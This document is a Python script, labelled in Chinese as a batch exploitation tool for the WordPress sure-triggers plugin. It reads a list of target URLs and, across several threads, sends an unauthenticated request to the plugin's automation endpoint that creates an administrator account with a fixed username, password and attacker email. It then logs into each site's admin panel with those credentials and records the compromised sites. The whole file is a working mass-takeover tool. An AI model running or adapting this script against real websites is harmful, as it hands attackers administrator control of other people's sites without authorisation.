import requests
import json
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
from tqdm import tqdm  # 进度条
import threading  # 日志锁
import colorama  # 用于跨平台彩色输出
from datetime import datetime

# 初始化colorama（用于Windows下的彩色输出）
colorama.init(autoreset=True)

# 禁用 SSL 警告（仅测试环境）
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 工具信息
TOOL_NAME = "WordPress sure-triggers 插件漏洞批量利用工具"
VERSION = "v1.0"
AUTHOR = "by YourName"

# 全局配置
PAYLOAD = {
    "integration": "WordPress",
    "type_event": "create_user_if_not_exists",
    "selected_options": {
        "user_email": "attacker@evil.com",
        "user_name": "eviladmin",
        "password": "EvilPassword123!",
        "role": "administrator"
    },
    "fields": [],
    "context": {}  # 移除了evil_code
}

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "Cookie": "_ga_EPLD3ZWRK6=GS2.1.s1756535624$o1$g1$t1756535720$j39$l0$h0; _ga=GA1.1.1182996985.1756535624"
}

# 日志锁（避免多线程写日志冲突）
log_lock = threading.Lock()

def log_to_file(message):
    """线程安全的日志写入"""
    with log_lock:
        with open("exploit_results.log", "a") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {message}\n")

def print_banner():
    """打印工具横幅"""
    banner = r"""
   __          _______  _    _  _____  ______ _   _ _____ _____ _   _  _____ 
   \ \        / /  __ \| |  | |/ ____||  ____| \ | |_   _/ ____| \ | |/ ____|
    \ \  /\  / /| |__) | |  | | (___  | |__  |  \| | | || |    |  \| | (___  
     \ \/  \/ / |  ___/| |  | |\___ \ |  __| | . ` | | || |    | . ` |\___ \ 
      \  /\  /  | |    | |__| |____) || |____| |\  |_| || |____| |\  |____) |
       \/  \/   |_|     \____/|_____/ |______|_| \_|_____\_____|_| \_|_____/ 
"""
    print(f"{colorama.Fore.CYAN}{banner}{colorama.Fore.RESET}")
    print(f"{colorama.Style.BRIGHT}{TOOL_NAME} {VERSION}{colorama.Style.RESET_ALL} {AUTHOR}\n")

def test_login(base_url, username, password):
    """测试登录后台"""
    login_url = urljoin(base_url, "/wp-login.php")
    session = requests.Session()
    
    # 首先获取登录页面获取必要的token
    try:
        response = session.get(login_url, verify=False, timeout=15)
        if response.status_code != 200:
            return False, "无法获取登录页面"
    except:
        return False, "连接登录页面失败"
    
    # 简单的解析获取wp-submit按钮值（实际可能需要更复杂的解析）
    wp_submit = "wp-submit"
    
    # 构造登录数据
    login_data = {
        "log": username,
        "pwd": password,
        "wp-submit": wp_submit,
        "redirect_to": urljoin(base_url, "/wp-admin/"),
        "testcookie": "1"
    }
    
    try:
        login_response = session.post(login_url, data=login_data, verify=False, timeout=15, allow_redirects=False)
        
        # 检查是否重定向到admin页面或返回200状态码（某些WP版本）
        if login_response.status_code == 302:
            location = login_response.headers.get('Location', '')
            if 'wp-admin' in location or 'dashboard' in location:
                return True, "登录成功 - 重定向到管理后台"
        elif login_response.status_code == 200:
            # 某些WP版本会返回200，但需要检查响应内容
            if "dashboard" in login_response.text.lower():
                return True, "登录成功 - 返回管理后台页面"
            else:
                return False, "登录失败 - 用户名或密码错误"
        else:
            return False, f"登录请求返回意外状态码: {login_response.status_code}"
    except Exception as e:
        return False, f"登录请求异常: {str(e)}"

def test_target(url):
    """测试单个目标"""
    base_url = url.strip()
    target_url = urljoin(base_url, "/wp-json/sure-triggers/v1/automation/action")
    result = {"url": base_url, "success": False, "error": None}

    try:
        # 发送漏洞利用请求
        response = requests.post(
            target_url,
            data=json.dumps(PAYLOAD),
            headers=HEADERS,
            verify=False,
            timeout=15
        )

        if response.status_code == 200:
            # 记录成功结果
            success_msg = f"""
[+] 目标: {base_url}
    → 状态: {colorama.Fore.GREEN}漏洞利用成功!{colorama.Fore.RESET}
    → 新增管理员账号: 
       - 用户名: {PAYLOAD['selected_options']['user_name']}
       - 密码: {PAYLOAD['selected_options']['password']}
"""
            print(success_msg)
            log_to_file(f"[SUCCESS] {base_url}")
            log_to_file(f"  → 新增管理员: {PAYLOAD['selected_options']['user_name']}:{PAYLOAD['selected_options']['password']}")
            
            # 尝试登录
            print(f"    → 尝试登录后台...")
            login_success, login_msg = test_login(
                base_url, 
                PAYLOAD['selected_options']['user_name'], 
                PAYLOAD['selected_options']['password']
            )
            
            if login_success:
                print(f"    → {colorama.Fore.GREEN}后台登录成功: {login_msg}{colorama.Fore.RESET}")
                log_to_file(f"  → 后台登录: 成功 - {login_msg}")
            else:
                print(f"    → {colorama.Fore.YELLOW}后台登录失败: {login_msg}{colorama.Fore.RESET}")
                log_to_file(f"  → 后台登录: 失败 - {login_msg}")
            
            result["success"] = True
        else:
            result["success"] = False

    except Exception as e:
        result["success"] = False
        result["error"] = str(e)

    return result

def main():
    # 打印工具横幅
    print_banner()
    
    print("[*] 目标: 从 urls.txt 读取 (每行一个URL)")
    print("[*] 结果: 终端实时显示 + 详细日志 (exploit_results.log)")

    # 读取目标列表
    try:
        with open("urls.txt", "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{colorama.Fore.RED}[-] 错误: 未找到 urls.txt 文件！{colorama.Fore.RESET}")
        return

    if not targets:
        print(f"{colorama.Fore.RED}[-] 错误: urls.txt 为空！{colorama.Fore.RESET}")
        return

    # 初始化日志文件
    with open("exploit_results.log", "w") as f:
        f.write(f"=== {TOOL_NAME} {VERSION} 漏洞利用日志 ===\n")
        f.write(f"测试开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

    # 多线程测试（带进度条）
    print(f"[*] 开始测试 {len(targets)} 个目标...")
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(test_target, url) for url in targets]
        for future in tqdm(as_completed(futures), total=len(targets), desc="进度"):
            future.result()  # 等待任务完成（异常已处理在函数内）

    print(f"{colorama.Fore.CYAN}[*] 测试完成！详细日志请查看 exploit_results.log{colorama.Fore.RESET}")

if __name__ == "__main__":
    main()
